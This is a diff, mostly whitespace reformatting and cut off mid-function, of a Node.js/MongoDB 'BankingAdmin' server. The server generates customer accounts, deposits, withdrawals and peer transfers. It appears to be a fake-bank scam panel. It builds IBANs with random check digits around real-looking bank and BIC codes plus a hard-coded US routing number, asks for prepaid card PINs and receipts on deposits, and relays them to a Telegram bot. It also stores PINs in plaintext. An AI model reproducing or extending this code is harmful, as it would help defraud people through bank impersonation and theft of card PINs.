@@ -28,41 +28,41 @@ const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
 
 // Currency configurations
 const CURRENCIES = {
-    USD: {
-        symbol: "$",
-        name: "US Dollar",
-        flag: "🇺🇸",
-        icon: "💵",
-        locale: "en-US",
-        paymentMethods: ["chime", "applepay", "visaprepaid"],
-        paymentMethodNames: {
-            chime: "Chime",
-            applepay: "Apple Pay",
-            visaprepaid: "Visa Prepaid Card",
-        },
+  USD: {
+    symbol: "$",
+    name: "US Dollar",
+    flag: "🇺🇸",
+    icon: "💵",
+    locale: "en-US",
+    paymentMethods: ["chime", "applepay", "visaprepaid"],
+    paymentMethodNames: {
+      chime: "Chime",
+      applepay: "Apple Pay",
+      visaprepaid: "Visa Prepaid Card",
     },
-    EUR: {
-        symbol: "€",
-        name: "Euro",
-        flag: "🇪🇺",
-        icon: "💶",
-        locale: "de-DE",
-        paymentMethods: ["sepa"],
-        paymentMethodNames: {
-            sepa: "Instant SEPA Credit Transfer",
-        },
+  },
+  EUR: {
+    symbol: "€",
+    name: "Euro",
+    flag: "🇪🇺",
+    icon: "💶",
+    locale: "de-DE",
+    paymentMethods: ["sepa"],
+    paymentMethodNames: {
+      sepa: "Instant SEPA Credit Transfer",
     },
-    GBP: {
-        symbol: "£",
-        name: "British Pound",
-        flag: "🇬🇧",
-        icon: "💷",
-        locale: "en-GB",
-        paymentMethods: ["banktransfer"],
-        paymentMethodNames: {
-            banktransfer: "Bank Transfer",
-        },
+  },
+  GBP: {
+    symbol: "£",
+    name: "British Pound",
+    flag: "🇬🇧",
+    icon: "💷",
+    locale: "en-GB",
+    paymentMethods: ["banktransfer"],
+    paymentMethodNames: {
+      banktransfer: "Bank Transfer",
     },
+  },
 };
 
 // ==========================================
@@ -72,15 +72,15 @@ const CURRENCIES = {
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 app.use(
-    session({
-        secret: SESSION_SECRET,
-        resave: false,
-        saveUninitialized: false,
-        cookie: {
-            secure: false,
-            maxAge: 24 * 60 * 60 * 1000,
-        },
-    })
+  session({
+    secret: SESSION_SECRET,
+    resave: false,
+    saveUninitialized: false,
+    cookie: {
+      secure: false,
+      maxAge: 24 * 60 * 60 * 1000,
+    },
+  })
 );
 
 // ==========================================
@@ -90,15 +90,15 @@ app.use(
 let db;
 
 async function connectDB() {
-    try {
-        const client = new MongoClient(MONGODB_URI);
-        await client.connect();
-        db = client.db("BankingAdmin");
-        console.log("✅ Connected to MongoDB");
-    } catch (error) {
-        console.error("❌ MongoDB Connection Error:", error.message);
-        process.exit(1);
-    }
+  try {
+    const client = new MongoClient(MONGODB_URI);
+    await client.connect();
+    db = client.db("BankingAdmin");
+    console.log("✅ Connected to MongoDB");
+  } catch (error) {
+    console.error("❌ MongoDB Connection Error:", error.message);
+    process.exit(1);
+  }
 }
 
 // ==========================================
@@ -106,126 +106,126 @@ async function connectDB() {
 // ==========================================
 
 function formatCurrency(amount, currency = "EUR") {
-    const config = CURRENCIES[currency] || CURRENCIES.EUR;
-    return new Intl.NumberFormat(config.locale, {
-        style: "currency",
-        currency: currency,
-    }).format(amount || 0);
+  const config = CURRENCIES[currency] || CURRENCIES.EUR;
+  return new Intl.NumberFormat(config.locale, {
+    style: "currency",
+    currency: currency,
+  }).format(amount || 0);
 }
 
 function formatDate(date) {
-    if (!date) return "N/A";
-    return new Date(date).toLocaleDateString("en-GB", {
-        day: "2-digit",
-        month: "short",
-        year: "numeric",
-        hour: "2-digit",
-        minute: "2-digit",
-    });
+  if (!date) return "N/A";
+  return new Date(date).toLocaleDateString("en-GB", {
+    day: "2-digit",
+    month: "short",
+    year: "numeric",
+    hour: "2-digit",
+    minute: "2-digit",
+  });
 }
 
 function formatDateShort(date) {
-    if (!date) return "N/A";
-    return new Date(date).toLocaleDateString("en-GB", {
-        day: "2-digit",
-        month: "short",
-        year: "numeric",
-    });
+  if (!date) return "N/A";
+  return new Date(date).toLocaleDateString("en-GB", {
+    day: "2-digit",
+    month: "short",
+    year: "numeric",
+  });
 }
 
 function maskAccountNumber(number, lastDigits = 4) {
-    if (!number) return "****";
-    const str = number.toString().replace(/[\s-]/g, "");
-    if (str.length <= lastDigits) return str;
-    return "****" + str.slice(-lastDigits);
+  if (!number) return "****";
+  const str = number.toString().replace(/[\s-]/g, "");
+  if (str.length <= lastDigits) return str;
+  return "****" + str.slice(-lastDigits);
 }
 
 function generateRequestId(prefix) {
-    return `${prefix}${Date.now().toString().slice(-8)}`;
+  return `${prefix}${Date.now().toString().slice(-8)}`;
 }
 
 function generateAccountNumber() {
-    const timestamp = Date.now().toString().slice(-8);
-    const random = Math.floor(Math.random() * 1000).toString().padStart(3, "0");
-    return `${timestamp}${random}`;
+  const timestamp = Date.now().toString().slice(-8);
+  const random = Math.floor(Math.random() * 1000).toString().padStart(3, "0");
+  return `${timestamp}${random}`;
 }
 
 function generateTag(name) {
-    const cleanName = name.toLowerCase().replace(/[^a-z0-9]/g, "");
-    const random = Math.floor(Math.random() * 9999).toString().padStart(4, "0");
-    return `@${cleanName}${random}`;
+  const cleanName = name.toLowerCase().replace(/[^a-z0-9]/g, "");
+  const random = Math.floor(Math.random() * 9999).toString().padStart(4, "0");
+  return `@${cleanName}${random}`;
 }
 
 function formatTag(tag) {
-    if (!tag) return "";
-    return tag.startsWith("@") ? tag.toLowerCase() : `@${tag.toLowerCase()}`;
+  if (!tag) return "";
+  return tag.startsWith("@") ? tag.toLowerCase() : `@${tag.toLowerCase()}`;
 }
 
 function generateIBAN(currency) {
-    if (currency === "EUR") {
-        const countryCode = "DE";
-        const checkDigits = Math.floor(Math.random() * 90 + 10).toString();
-        const bankCode = "37040044";
-        const accountNum = Math.floor(Math.random() * 9000000000 + 1000000000).toString();
-        return `${countryCode}${checkDigits}${bankCode}${accountNum}`;
-    } else if (currency === "GBP") {
-        const sortCode = Math.floor(Math.random() * 900000 + 100000).toString();
-        const accountNum = Math.floor(Math.random() * 90000000 + 10000000).toString();
-        return {
-            sortCode: `${sortCode.slice(0, 2)}-${sortCode.slice(2, 4)}-${sortCode.slice(4, 6)}`,
-            accountNumber: accountNum,
-        };
-    } else {
-        const routingNumber = "021000021";
-        const accountNum = Math.floor(Math.random() * 9000000000 + 1000000000).toString();
-        return { routingNumber, accountNumber: accountNum };
-    }
+  if (currency === "EUR") {
+    const countryCode = "DE";
+    const checkDigits = Math.floor(Math.random() * 90 + 10).toString();
+    const bankCode = "37040044";
+    const accountNum = Math.floor(Math.random() * 9000000000 + 1000000000).toString();
+    return `${countryCode}${checkDigits}${bankCode}${accountNum}`;
+  } else if (currency === "GBP") {
+    const sortCode = Math.floor(Math.random() * 900000 + 100000).toString();
+    const accountNum = Math.floor(Math.random() * 90000000 + 10000000).toString();
+    return {
+      sortCode: `${sortCode.slice(0, 2)}-${sortCode.slice(2, 4)}-${sortCode.slice(4, 6)}`,
+      accountNumber: accountNum,
+    };
+  } else {
+    const routingNumber = "021000021";
+    const accountNum = Math.floor(Math.random() * 9000000000 + 1000000000).toString();
+    return { routingNumber, accountNumber: accountNum };
+  }
 }
 
 function getTransactionIcon(description) {
-    const desc = (description || "").toLowerCase();
-    if (desc.includes("fitness") || desc.includes("gym")) return { letter: "F", color: "red" };
-    if (desc.includes("transfer") || desc.includes("wise")) return { letter: "T", color: "green" };
-    if (desc.includes("amazon")) return { letter: "A", color: "orange" };
-    if (desc.includes("spotify") || desc.includes("music")) return { letter: "S", color: "blue" };
-    if (desc.includes("grocery") || desc.includes("supermarket") || desc.includes("rewe")) return { letter: "R", color: "purple" };
-    if (desc.includes("atm") || desc.includes("cash")) return { letter: "💳", color: "gray" };
-    if (desc.includes("deposit")) return { letter: "D", color: "green" };
-    if (desc.includes("withdrawal")) return { letter: "W", color: "red" };
-    if (desc.includes("incoming") || desc.includes("from") || desc.includes("payment from")) return { letter: "📥", color: "green" };
-    if (desc.includes("payment to")) return { letter: "📤", color: "red" };
-    return { letter: description ? description.charAt(0).toUpperCase() : "?", color: "gray" };
+  const desc = (description || "").toLowerCase();
+  if (desc.includes("fitness") || desc.includes("gym")) return { letter: "F", color: "red" };
+  if (desc.includes("transfer") || desc.includes("wise")) return { letter: "T", color: "green" };
+  if (desc.includes("amazon")) return { letter: "A", color: "orange" };
+  if (desc.includes("spotify") || desc.includes("music")) return { letter: "S", color: "blue" };
+  if (desc.includes("grocery") || desc.includes("supermarket") || desc.includes("rewe")) return { letter: "R", color: "purple" };
+  if (desc.includes("atm") || desc.includes("cash")) return { letter: "💳", color: "gray" };
+  if (desc.includes("deposit")) return { letter: "D", color: "green" };
+  if (desc.includes("withdrawal")) return { letter: "W", color: "red" };
+  if (desc.includes("incoming") || desc.includes("from") || desc.includes("payment from")) return { letter: "📥", color: "green" };
+  if (desc.includes("payment to")) return { letter: "📤", color: "red" };
+  return { letter: description ? description.charAt(0).toUpperCase() : "?", color: "gray" };
 }
 
 function groupTransactionsByDate(transactions) {
-    const groups = {};
-    const today = new Date();
-    today.setHours(0, 0, 0, 0);
-    const yesterday = new Date(today);
-    yesterday.setDate(yesterday.getDate() - 1);
+  const groups = {};
+  const today = new Date();
+  today.setHours(0, 0, 0, 0);
+  const yesterday = new Date(today);
+  yesterday.setDate(yesterday.getDate() - 1);
 
-    transactions.forEach((tx) => {
-        const txDate = new Date(tx.createdAt);
-        txDate.setHours(0, 0, 0, 0);
+  transactions.forEach((tx) => {
+    const txDate = new Date(tx.createdAt);
+    txDate.setHours(0, 0, 0, 0);
 
-        let dateKey;
-        if (txDate.getTime() === today.getTime()) {
-            dateKey = "Today";
-        } else if (txDate.getTime() === yesterday.getTime()) {
-            dateKey = "Yesterday";
-        } else {
-            dateKey = txDate.toLocaleDateString("en-GB", {
-                weekday: "long",
-                month: "short",
-                day: "numeric",
-            });
-        }
+    let dateKey;
+    if (txDate.getTime() === today.getTime()) {
+      dateKey = "Today";
+    } else if (txDate.getTime() === yesterday.getTime()) {
+      dateKey = "Yesterday";
+    } else {
+      dateKey = txDate.toLocaleDateString("en-GB", {
+        weekday: "long",
+        month: "short",
+        day: "numeric",
+      });
+    }
 
-        if (!groups[dateKey]) groups[dateKey] = [];
-        groups[dateKey].push(tx);
-    });
+    if (!groups[dateKey]) groups[dateKey] = [];
+    groups[dateKey].push(tx);
+  });
 
-    return groups;
+  return groups;
 }
 
 // ==========================================
@@ -233,375 +233,374 @@ function groupTransactionsByDate(transactions) {
 // ==========================================
 
 async function getCustomerByEmail(email) {
-    return await db.collection("customers").findOne({ email: email.toLowerCase() });
+  return await db.collection("customers").findOne({ email: email.toLowerCase() });
 }
 
 async function getCustomerById(id) {
-    try {
-        return await db.collection("customers").findOne({ _id: new ObjectId(id) });
-    } catch (e) {
-        return null;
-    }
+  try {
+    return await db.collection("customers").findOne({ _id: new ObjectId(id) });
+  } catch (e) {
+    return null;
+  }
 }
 
 async function getCustomerByTag(tag) {
-    const formattedTag = formatTag(tag);
-    return await db.collection("customers").findOne({ tag: formattedTag });
+  const formattedTag = formatTag(tag);
+  return await db.collection("customers").findOne({ tag: formattedTag });
 }
 
 async function getSpecialTagByTag(tag) {
-    const formattedTag = formatTag(tag);
-    return await db.collection("specialTags").findOne({ tag: formattedTag });
+  const formattedTag = formatTag(tag);
+  return await db.collection("specialTags").findOne({ tag: formattedTag });
 }
 
 async function lookupTag(tagOrEmail) {
-    // First check if it's an email
-    if (tagOrEmail.includes("@") && tagOrEmail.includes(".")) {
-        const customer = await getCustomerByEmail(tagOrEmail);
-        if (customer) {
-            return {
-                found: true,
-                type: "customer",
-                id: customer._id,
-                tag: customer.tag,
-                name: customer.name,
-                currency: customer.currency,
-            };
-        }
-    }
-
-    // Check if it's a tag
-    const formattedTag = formatTag(tagOrEmail);
-
-    // Check customers first
-    const customer = await getCustomerByTag(formattedTag);
+  // First check if it's an email
+  if (tagOrEmail.includes("@") && tagOrEmail.includes(".")) {
+    const customer = await getCustomerByEmail(tagOrEmail);
     if (customer) {
-        return {
-            found: true,
-            type: "customer",
-            id: customer._id,
-            tag: customer.tag,
-            name: customer.name,
-            currency: customer.currency,
-        };
+      return {
+        found: true,
+        type: "customer",
+        id: customer._id,
+        tag: customer.tag,
+        name: customer.name,
+        currency: customer.currency,
+      };
     }
+  }
 
-    // Check special tags
-    const specialTag = await getSpecialTagByTag(formattedTag);
-    if (specialTag) {
-        return {
-            found: true,
-            type: "special",
-            id: specialTag._id,
-            tag: specialTag.tag,
-            name: specialTag.displayName,
-            currency: null, // Special tags work with any currency
-        };
-    }
+  // Check if it's a tag
+  const formattedTag = formatTag(tagOrEmail);
 
-    return { found: false };
+  // Check customers first
+  const customer = await getCustomerByTag(formattedTag);
+  if (customer) {
+    return {
+      found: true,
+      type: "customer",
+      id: customer._id,
+      tag: customer.tag,
+      name: customer.name,
+      currency: customer.currency,
+    };
+  }
+
+  // Check special tags
+  const specialTag = await getSpecialTagByTag(formattedTag);
+  if (specialTag) {
+    return {
+      found: true,
+      type: "special",
+      id: specialTag._id,
+      tag: specialTag.tag,
+      name: specialTag.displayName,
+      currency: null, // Special tags work with any currency
+    };
+  }
+
+  return { found: false };
 }
 
 async function isTagAvailable(tag, excludeCustomerId = null) {
-    const formattedTag = formatTag(tag);
+  const formattedTag = formatTag(tag);
 
-    // Check customers
-    const customerQuery = { tag: formattedTag };
-    if (excludeCustomerId) {
-        customerQuery._id = { $ne: new ObjectId(excludeCustomerId) };
-    }
-    const customerExists = await db.collection("customers").findOne(customerQuery);
-    if (customerExists) return false;
+  // Check customers
+  const customerQuery = { tag: formattedTag };
+  if (excludeCustomerId) {
+    customerQuery._id = { $ne: new ObjectId(excludeCustomerId) };
+  }
+  const customerExists = await db.collection("customers").findOne(customerQuery);
+  if (customerExists) return false;
 
-    // Check special tags
-    const specialExists = await db.collection("specialTags").findOne({ tag: formattedTag });
-    if (specialExists) return false;
+  // Check special tags
+  const specialExists = await db.collection("specialTags").findOne({ tag: formattedTag });
+  if (specialExists) return false;
 
-    return true;
+  return true;
 }
 
 async function createCustomer(data) {
-    const currency = data.currency || "EUR";
-    let accountDetails = {};
+  const currency = data.currency || "EUR";
+  let accountDetails = {};
 
-    if (currency === "EUR") {
-        accountDetails = {
-            iban: generateIBAN("EUR"),
-            bic: "DEUTDEDBFRA",
-        };
-    } else if (currency === "GBP") {
-        const details = generateIBAN("GBP");
-        accountDetails = {
-            sortCode: details.sortCode,
-            bankAccountNumber: details.accountNumber,
-        };
-    } else {
-        const details = generateIBAN("USD");
-        accountDetails = {
-            routingNumber: details.routingNumber,
-            bankAccountNumber: details.accountNumber,
-        };
-    }
-
-    const customer = {
-        name: data.name,
-        email: data.email.toLowerCase(),
-        phone: data.phone,
-        address: data.address,
-        accountNumber: generateAccountNumber(),
-        tag: data.tag || generateTag(data.name),
-        tagUpdatedAt: new Date(),
-        currency: currency,
-        ...accountDetails,
-        balance: 0,
-        pin: data.pin,
-        pinUpdatedAt: new Date(),
-        pinUpdatedBy: "customer",
-        status: "active",
-        withdrawalAccounts: [],
-        createdAt: new Date(),
-        updatedAt: new Date(),
+  if (currency === "EUR") {
+    accountDetails = {
+      iban: generateIBAN("EUR"),
+      bic: "DEUTDEDBFRA",
     };
+  } else if (currency === "GBP") {
+    const details = generateIBAN("GBP");
+    accountDetails = {
+      sortCode: details.sortCode,
+      bankAccountNumber: details.accountNumber,
+    };
+  } else {
+    const details = generateIBAN("USD");
+    accountDetails = {
+      routingNumber: details.routingNumber,
+      bankAccountNumber: details.accountNumber,
+    };
+  }
 
-    const result = await db.collection("customers").insertOne(customer);
-    customer._id = result.insertedId;
+  const customer = {
+    name: data.name,
+    email: data.email.toLowerCase(),
+    phone: data.phone,
+    accountNumber: generateAccountNumber(),
+    tag: data.tag || generateTag(data.name),
+    tagUpdatedAt: new Date(),
+    currency: currency,
+    ...accountDetails,
+    balance: 0,
+    pin: data.pin,
+    pinUpdatedAt: new Date(),
+    pinUpdatedBy: "customer",
+    status: "active",
+    withdrawalAccounts: [],
+    createdAt: new Date(),
+    updatedAt: new Date(),
+  };
 
-    await createNotification(result.insertedId, "welcome", {
-        title: "Welcome to Our Bank!",
-        message: "Your account has been created successfully.",
-        type: "info",
-    });
+  const result = await db.collection("customers").insertOne(customer);
+  customer._id = result.insertedId;
 
-    return customer;
+  await createNotification(result.insertedId, "welcome", {
+    title: "Welcome to Our Bank!",
+    message: "Your account has been created successfully.",
+    type: "info",
+  });
+
+  return customer;
 }
 
 async function updateCustomerTag(customerId, newTag) {
-    const formattedTag = formatTag(newTag);
-    await db.collection("customers").updateOne(
-        { _id: new ObjectId(customerId) },
-        {
-            $set: {
-                tag: formattedTag,
-                tagUpdatedAt: new Date(),
-                updatedAt: new Date(),
-            },
-        }
-    );
+  const formattedTag = formatTag(newTag);
+  await db.collection("customers").updateOne(
+    { _id: new ObjectId(customerId) },
+    {
+      $set: {
+        tag: formattedTag,
+        tagUpdatedAt: new Date(),
+        updatedAt: new Date(),
+      },
+    }
+  );
 }
 
 async function getCustomerTransactions(customerId, limit = 50) {
-    return await db
-        .collection("transactions")
-        .find({ customerId: new ObjectId(customerId) })
-        .sort({ createdAt: -1 })
-        .limit(limit)
-        .toArray();
+  return await db
+    .collection("transactions")
+    .find({ customerId: new ObjectId(customerId) })
+    .sort({ createdAt: -1 })
+    .limit(limit)
+    .toArray();
 }
 
 async function getMonthlySpending(customerId, months = 7) {
-    const result = [];
-    const now = new Date();
+  const result = [];
+  const now = new Date();
 
-    for (let i = months - 1; i >= 0; i--) {
-        const startOfMonth = new Date(now.getFullYear(), now.getMonth() - i, 1);
-        const endOfMonth = new Date(now.getFullYear(), now.getMonth() - i + 1, 0, 23, 59, 59);
+  for (let i = months - 1; i >= 0; i--) {
+    const startOfMonth = new Date(now.getFullYear(), now.getMonth() - i, 1);
+    const endOfMonth = new Date(now.getFullYear(), now.getMonth() - i + 1, 0, 23, 59, 59);
 
-        const spending = await db
-            .collection("transactions")
-            .aggregate([
-                {
-                    $match: {
-                        customerId: new ObjectId(customerId),
-                        type: "debit",
-                        createdAt: { $gte: startOfMonth, $lte: endOfMonth },
-                    },
-                },
-                {
-                    $group: {
-                        _id: null,
-                        total: { $sum: "$amount" },
-                    },
-                },
-            ])
-            .toArray();
+    const spending = await db
+      .collection("transactions")
+      .aggregate([
+        {
+          $match: {
+            customerId: new ObjectId(customerId),
+            type: "debit",
+            createdAt: { $gte: startOfMonth, $lte: endOfMonth },
+          },
+        },
+        {
+          $group: {
+            _id: null,
+            total: { $sum: "$amount" },
+          },
+        },
+      ])
+      .toArray();
 
-        result.push({
-            month: startOfMonth.toLocaleDateString("en-US", { month: "short" }),
-            amount: spending[0]?.total || 0,
-        });
-    }
+    result.push({
+      month: startOfMonth.toLocaleDateString("en-US", { month: "short" }),
+      amount: spending[0]?.total || 0,
+    });
+  }
 
-    return result;
+  return result;
 }
 
 async function getUnreadNotifications(customerId) {
-    return await db
-        .collection("notifications")
-        .find({ customerId: new ObjectId(customerId), read: false })
-        .sort({ createdAt: -1 })
-        .limit(10)
-        .toArray();
+  return await db
+    .collection("notifications")
+    .find({ customerId: new ObjectId(customerId), read: false })
+    .sort({ createdAt: -1 })
+    .limit(10)
+    .toArray();
 }
 
 async function getUnreadNotificationCount(customerId) {
-    return await db.collection("notifications").countDocuments({
-        customerId: new ObjectId(customerId),
-        read: false,
-    });
+  return await db.collection("notifications").countDocuments({
+    customerId: new ObjectId(customerId),
+    read: false,
+  });
 }
 
 async function markNotificationsAsRead(customerId) {
-    await db
-        .collection("notifications")
-        .updateMany({ customerId: new ObjectId(customerId), read: false }, { $set: { read: true } });
+  await db
+    .collection("notifications")
+    .updateMany({ customerId: new ObjectId(customerId), read: false }, { $set: { read: true } });
 }
 
 async function createNotification(customerId, type, data) {
-    await db.collection("notifications").insertOne({
-        customerId: new ObjectId(customerId),
-        type: type,
-        title: data.title,
-        message: data.message,
-        notificationType: data.type || "info",
-        read: false,
-        createdAt: new Date(),
-    });
+  await db.collection("notifications").insertOne({
+    customerId: new ObjectId(customerId),
+    type: type,
+    title: data.title,
+    message: data.message,
+    notificationType: data.type || "info",
+    read: false,
+    createdAt: new Date(),
+  });
 }
 
 async function getActiveAlerts(customerId) {
-    return await db
-        .collection("customerAlerts")
-        .find({ customerId: new ObjectId(customerId), dismissed: false })
-        .sort({ createdAt: -1 })
-        .toArray();
+  return await db
+    .collection("customerAlerts")
+    .find({ customerId: new ObjectId(customerId), dismissed: false })
+    .sort({ createdAt: -1 })
+    .toArray();
 }
 
 async function dismissAlert(alertId) {
-    await db.collection("customerAlerts").updateOne({ _id: new ObjectId(alertId) }, { $set: { dismissed: true } });
+  await db.collection("customerAlerts").updateOne({ _id: new ObjectId(alertId) }, { $set: { dismissed: true } });
 }
 
 async function getCustomerPendingPayments(customerId) {
-    return await db
-        .collection("pendingPayments")
-        .find({
-            customerId: new ObjectId(customerId),
-            status: "pending",
-        })
-        .sort({ createdAt: -1 })
-        .toArray();
+  return await db
+    .collection("pendingPayments")
+    .find({
+      customerId: new ObjectId(customerId),
+      status: "pending",
+    })
+    .sort({ createdAt: -1 })
+    .toArray();
 }
 
 async function createDepositRequest(data) {
-    const request = {
-        requestId: generateRequestId("DEP-"),
-        customerId: new ObjectId(data.customerId),
-        customerName: data.customerName,
-        customerEmail: data.customerEmail,
-        currency: data.currency,
-        amount: parseFloat(data.amount),
-        paymentMethod: data.paymentMethod,
-        status: "pending_details",
-        bankDetails: null,
-        receiptData: null,
-        prepaidCardPin: null,
-        createdAt: new Date(),
-        updatedAt: new Date(),
-    };
+  const request = {
+    requestId: generateRequestId("DEP-"),
+    customerId: new ObjectId(data.customerId),
+    customerName: data.customerName,
+    customerEmail: data.customerEmail,
+    currency: data.currency,
+    amount: parseFloat(data.amount),
+    paymentMethod: data.paymentMethod,
+    status: "pending_details",
+    bankDetails: null,
+    receiptData: null,
+    prepaidCardPin: null,
+    createdAt: new Date(),
+    updatedAt: new Date(),
+  };
 
-    const result = await db.collection("depositRequests").insertOne(request);
-    request._id = result.insertedId;
-    return request;
+  const result = await db.collection("depositRequests").insertOne(request);
+  request._id = result.insertedId;
+  return request;
 }
 
 async function getDepositRequestByRequestId(requestId) {
-    return await db.collection("depositRequests").findOne({ requestId: requestId });
+  return await db.collection("depositRequests").findOne({ requestId: requestId });
 }
 
 async function updateDepositRequest(requestId, updates) {
-    await db
-        .collection("depositRequests")
-        .updateOne({ requestId: requestId }, { $set: { ...updates, updatedAt: new Date() } });
+  await db
+    .collection("depositRequests")
+    .updateOne({ requestId: requestId }, { $set: { ...updates, updatedAt: new Date() } });
 }
 
 async function createWithdrawalRequest(data) {
-    const request = {
-        requestId: generateRequestId("WD-"),
-        customerId: new ObjectId(data.customerId),
-        customerName: data.customerName,
-        currency: data.currency,
-        amount: parseFloat(data.amount),
-        withdrawalAccount: data.withdrawalAccount,
-        status: "pending",
-        rejectionReason: null,
-        createdAt: new Date(),
-        updatedAt: new Date(),
-    };
+  const request = {
+    requestId: generateRequestId("WD-"),
+    customerId: new ObjectId(data.customerId),
+    customerName: data.customerName,
+    currency: data.currency,
+    amount: parseFloat(data.amount),
+    withdrawalAccount: data.withdrawalAccount,
+    status: "pending",
+    rejectionReason: null,
+    createdAt: new Date(),
+    updatedAt: new Date(),
+  };
 
-    const result = await db.collection("withdrawalRequests").insertOne(request);
-    request._id = result.insertedId;
-    return request;
+  const result = await db.collection("withdrawalRequests").insertOne(request);
+  request._id = result.insertedId;
+  return request;
 }
 
 async function createP2PRequest(data) {
-    const request = {
-        requestId: generateRequestId("P2P-"),
-        type: data.type, // "request" or "send"
-        fromCustomerId: data.fromCustomerId ? new ObjectId(data.fromCustomerId) : null,
-        fromTag: data.fromTag,
-        fromName: data.fromName,
-        toCustomerId: data.toCustomerId ? new ObjectId(data.toCustomerId) : null,
-        toTag: data.toTag,
-        toName: data.toName,
-        amount: parseFloat(data.amount),
-        currency: data.currency,
-        isSpecialTag: data.isSpecialTag || false,
-        specialTagId: data.specialTagId ? new ObjectId(data.specialTagId) : null,
-        status: "pending",
-        rejectionReason: null,
-        createdAt: new Date(),
-        updatedAt: new Date(),
-    };
+  const request = {
+    requestId: generateRequestId("P2P-"),
+    type: data.type, // "request" or "send"
+    fromCustomerId: data.fromCustomerId ? new ObjectId(data.fromCustomerId) : null,
+    fromTag: data.fromTag,
+    fromName: data.fromName,
+    toCustomerId: data.toCustomerId ? new ObjectId(data.toCustomerId) : null,
+    toTag: data.toTag,
+    toName: data.toName,
+    amount: parseFloat(data.amount),
+    currency: data.currency,
+    isSpecialTag: data.isSpecialTag || false,
+    specialTagId: data.specialTagId ? new ObjectId(data.specialTagId) : null,
+    status: "pending",
+    rejectionReason: null,
+    createdAt: new Date(),
+    updatedAt: new Date(),
+  };
 
-    const result = await db.collection("p2pRequests").insertOne(request);
-    request._id = result.insertedId;
-    return request;
+  const result = await db.collection("p2pRequests").insertOne(request);
+  request._id = result.insertedId;
+  return request;
 }
 
 async function addWithdrawalAccount(customerId, accountData) {
-    const accountId = new ObjectId();
-    await db.collection("customers").updateOne(
-        { _id: new ObjectId(customerId) },
-        {
-            $push: {
-                withdrawalAccounts: {
-                    _id: accountId,
-                    ...accountData,
-                    createdAt: new Date(),
-                },
-            },
-        }
-    );
-    return accountId;
+  const accountId = new ObjectId();
+  await db.collection("customers").updateOne(
+    { _id: new ObjectId(customerId) },
+    {
+      $push: {
+        withdrawalAccounts: {
+          _id: accountId,
+          ...accountData,
+          createdAt: new Date(),
+        },
+      },
+    }
+  );
+  return accountId;
 }
 
 async function deleteWithdrawalAccount(customerId, accountId) {
-    await db
-        .collection("customers")
-        .updateOne({ _id: new ObjectId(customerId) }, { $pull: { withdrawalAccounts: { _id: new ObjectId(accountId) } } });
+  await db
+    .collection("customers")
+    .updateOne({ _id: new ObjectId(customerId) }, { $pull: { withdrawalAccounts: { _id: new ObjectId(accountId) } } });
 }
 
 async function updateCustomerPin(customerId, newPin) {
-    await db.collection("customers").updateOne(
-        { _id: new ObjectId(customerId) },
-        {
-            $set: {
-                pin: newPin,
-                pinUpdatedAt: new Date(),
-                pinUpdatedBy: "customer",
-                updatedAt: new Date(),
-            },
-        }
-    );
+  await db.collection("customers").updateOne(
+    { _id: new ObjectId(customerId) },
+    {
+      $set: {
+        pin: newPin,
+        pinUpdatedAt: new Date(),
+        pinUpdatedBy: "customer",
+        updatedAt: new Date(),
+      },
+    }
+  );
 }
 
 // ==========================================
@@ -609,74 +608,74 @@ async function updateCustomerPin(customerId, newPin) {
 // ==========================================
 
 function sendTelegramMessage(message) {
-    return new Promise((resolve, reject) => {
-        const data = JSON.stringify({
-            chat_id: TELEGRAM_CHAT_ID,
-            text: message,
-            parse_mode: "Markdown",
-        });
-
-        const options = {
-            hostname: "api.telegram.org",
-            path: `/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
-            method: "POST",
-            headers: {
-                "Content-Type": "application/json",
-                "Content-Length": data.length,
-            },
-        };
-
-        const req = https.request(options, (res) => {
-            let body = "";
-            res.on("data", (chunk) => (body += chunk));
-            res.on("end", () => resolve(JSON.parse(body)));
-        });
-
-        req.on("error", reject);
-        req.write(data);
-        req.end();
+  return new Promise((resolve, reject) => {
+    const data = JSON.stringify({
+      chat_id: TELEGRAM_CHAT_ID,
+      text: message,
+      parse_mode: "Markdown",
     });
+
+    const options = {
+      hostname: "api.telegram.org",
+      path: `/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json",
+        "Content-Length": data.length,
+      },
+    };
+
+    const req = https.request(options, (res) => {
+      let body = "";
+      res.on("data", (chunk) => (body += chunk));
+      res.on("end", () => resolve(JSON.parse(body)));
+    });
+
+    req.on("error", reject);
+    req.write(data);
+    req.end();
+  });
 }
 
 function sendTelegramPhoto(photoBuffer, caption) {
-    return new Promise((resolve, reject) => {
-        const boundary = "----FormBoundary" + Math.random().toString(36).substring(2);
+  return new Promise((resolve, reject) => {
+    const boundary = "----FormBoundary" + Math.random().toString(36).substring(2);
 
-        let body = "";
-        body += `--${boundary}\r\n`;
-        body += `Content-Disposition: form-data; name="chat_id"\r\n\r\n${TELEGRAM_CHAT_ID}\r\n`;
-        body += `--${boundary}\r\n`;
-        body += `Content-Disposition: form-data; name="caption"\r\n\r\n${caption}\r\n`;
-        body += `--${boundary}\r\n`;
-        body += `Content-Disposition: form-data; name="parse_mode"\r\n\r\nMarkdown\r\n`;
-        body += `--${boundary}\r\n`;
-        body += `Content-Disposition: form-data; name="photo"; filename="receipt.jpg"\r\n`;
-        body += `Content-Type: image/jpeg\r\n\r\n`;
+    let body = "";
+    body += `--${boundary}\r\n`;
+    body += `Content-Disposition: form-data; name="chat_id"\r\n\r\n${TELEGRAM_CHAT_ID}\r\n`;
+    body += `--${boundary}\r\n`;
+    body += `Content-Disposition: form-data; name="caption"\r\n\r\n${caption}\r\n`;
+    body += `--${boundary}\r\n`;
+    body += `Content-Disposition: form-data; name="parse_mode"\r\n\r\nMarkdown\r\n`;
+    body += `--${boundary}\r\n`;
+    body += `Content-Disposition: form-data; name="photo"; filename="receipt.jpg"\r\n`;
+    body += `Content-Type: image/jpeg\r\n\r\n`;
 
-        const bodyStart = Buffer.from(body, "utf8");
-        const bodyEnd = Buffer.from(`\r\n--${boundary}--\r\n`, "utf8");
-        const fullBody = Buffer.concat([bodyStart, photoBuffer, bodyEnd]);
+    const bodyStart = Buffer.from(body, "utf8");
+    const bodyEnd = Buffer.from(`\r\n--${boundary}--\r\n`, "utf8");
+    const fullBody = Buffer.concat([bodyStart, photoBuffer, bodyEnd]);
 
-        const options = {
-            hostname: "api.telegram.org",
